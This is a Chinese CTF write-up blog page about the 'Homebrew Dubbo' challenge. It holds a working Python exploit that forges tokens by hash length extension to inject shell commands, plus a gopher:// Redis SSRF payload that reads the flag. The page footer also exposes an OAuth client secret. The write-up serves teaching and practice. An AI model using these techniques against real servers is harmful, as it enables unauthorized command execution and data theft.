@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>安恒月赛Homebrew Dubbo |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="安恒月赛Homebrew Dubbo |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="安恒月赛Homebrew Dubbo"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/jaXT3BKnY/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>安恒月赛Homebrew Dubbo</h1>
+            <span class="meta">
+            	Posted on
+              2020-07-26，4 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>首先就是页面F12。得到js.map。里面有个API_BASE+'upload/list'<br>
+可以访问/api/upload/list<br>
+得到所有上传文件的列表。第一个就是源码<br>
+下下来审计<br>
+有三个大类</p>
+<pre><code>flag_provider
+#flag相关
+frontend_consumer
+#路由部分
+storage_provider
+#路由对应功能的代码实现
+</code></pre>
+<p>首先看flag_provider<br>
+<img src="https://guokeya.github.io/post-images/1595758005238.png" alt="" loading="lazy"><br>
+可以看到。读取了/flag。放在了redis里。key为flag<br>
+那操纵redis。ssrf+gopher或者RCE<br>
+先看文件上传部分。<br>
+<img src="https://guokeya.github.io/post-images/1595758323735.png" alt="" loading="lazy"><br>
+前面都没啥。我们跟进putfile方法看看<br>
+<img src="https://guokeya.github.io/post-images/1595758597644.png" alt="" loading="lazy"><br>
+好像也没啥东西。<br>
+继续看下载功能<br>
+<img src="https://guokeya.github.io/post-images/1595758708668.png" alt="" loading="lazy"><br>
+根据之前上传下载一番操作。我们知道下载是根据一个base64的token下载的<br>
+继续更跟进这个验证token的函数<br>
+<img src="https://guokeya.github.io/post-images/1595760282624.png" alt="" loading="lazy"><br>
+简单来说就我们传入的</p>
+<pre><code>{
+    &quot;id&quot;:&quot;xxxxx&quot;,
+    &quot;sign&quot;:&quot;xxxx&quot;
+}
+base64(md5(secret.id))==sign
+</code></pre>
+<p>而密钥最后三位未知。就知道一个长度。然后继续看<br>
+他验证完token就会调用Readfile类<br>
+<img src="https://guokeya.github.io/post-images/1595760670650.png" alt="" loading="lazy"><br>
+这里存在命令注入。但是靶机不出网。然后看看能不能回显<br>
+之前不是有文件上传嘛。。。。继续看他是咋实现文件下载的。</p>
+<pre><code>上传的时候对文件UUID命名进行打包
+下载的时候对UUID命名文件进行解压。然后下载文件夹内第一个文件
+</code></pre>
+<p>那么我们只要把文件随便写入一个UUID内。然后下载不就好了。<br>
+然而。。。他下载就是根据ID来的。。。一但我们写入文件夹。。签名用hashdump。他就会去解压UUID%00%00的那个文件夹。。。。。<br>
+等等。一开始我们访问的/api/upload/list会显示所有用户上传的文件。并且其中有id和token<br>
+<img src="https://guokeya.github.io/post-images/1595762465305.png" alt="" loading="lazy"><br>
+那么思路很清楚了</p>
+<pre><code>1。利用hashpump对ID进行注入。将结果写入txt并且zip压缩
+2。访问/api/upload/list。查找我们生成的UUID对应的Token
+3。解压ZIP。带着Token下载对应的文件。
+</code></pre>
+<p>以下是脚本</p>
+<pre><code>import requests
+import base64
+import hashpumpy
+import json
+import uuid
+import sys
+url = &quot;http://IP/api/upload&quot;
+def init():
+    r=requests.post(url=url,files=[('file', ('testa.txt', 'abcd'))])
+    token=json.loads(base64.b64decode(json.loads(r.text)['data']['token']))
+    return token
+
+def rce(token):
+    filename = str(uuid.uuid4())
+    initid=base64.b64decode(token['id'])
+    initsign=base64.b64decode(token['sign'])
+    command=sys.argv[1]
+    hash=hashpumpy.hashpump(initsign,initid,';' + command + ' &gt;&gt; ' + filename + '.txt;zip ' + filename + '.zip ' + filename + '.txt;rm -rf ' + filename + '.txt;',32)
+    newid=base64.b64encode(hash[1])
+    newsign=base64.b64encode(hash[0])
+    token['id']=str(newid)
+    token['sign']=str(newsign)
+    downloadtoken=json.dumps(token)
+    r=requests.get(url+'?token='+base64.b64encode(downloadtoken))
+    return filename
+filename=rce(init())
+r=json.loads(requests.get('http://IP/api/upload/list').text)['data']
+for i in r:
+    if i['id']==filename:
+        r2=requests.get(url+'?token='+i['token']).text
+        print(r2)
+        exit()
+</code></pre>
+<p>然后可以利用curl gopher打Redis<br>
+源码中的redis密码是假的。。。ps -ef发现本地起的java<br>
+<img src="https://guokeya.github.io/post-images/1595763557464.png" alt="" loading="lazy"></p>
+<pre><code>unzip -d /tmp/123 /usr/bin/flag_provider-0.0.1-SNAPSHOT.jar
+</code></pre>
+<p>解压到tmp。然后去里面搜application-prod.properties<br>
+知道在/tmp/123/BOOT-INF/classes/application-localhost.preperties<br>
+得到密码<br>
+然后本地开个wireshark。设个一样的密码<br>
+<img src="https://guokeya.github.io/post-images/1595764551239.png" alt="" loading="lazy"><br>
+写个脚本跑下</p>
+<pre><code>data='2a320d0a24340d0a415554480d0a2432360d0a676c7a6a696e5f77616e74735f615f6769726c5f667269656e640d0a2a310d0a24370d0a434f4d4d414e440d0a2a320d0a24330d0a6765740d0a24340d0a666c61670d0a'
+data2=''
+for i in range(0,len(data),2):
+    data2+='%'+data[i]+data[i+1]
+print(data2)
+</code></pre>
+<p>得到的payload后面还得加上</p>
+<pre><code>%2A1%0D%0A%244%0D%0Aquit%0D%0A
+解码后为
+*1
+$4
+quit
+
+其中*1表示。。。就。。。就。get flag。这样算两个。quit这样算一个。空格分隔？
+$4。就表示几个字符串
+字符串
+</code></pre>
+<p>然后curl gopher://redis:6379/_PAYLOAD即可</p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/u6ks9KJMm/">
+              <span class="post-title">
+                [网鼎杯 2020 朱雀组]Think Java&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
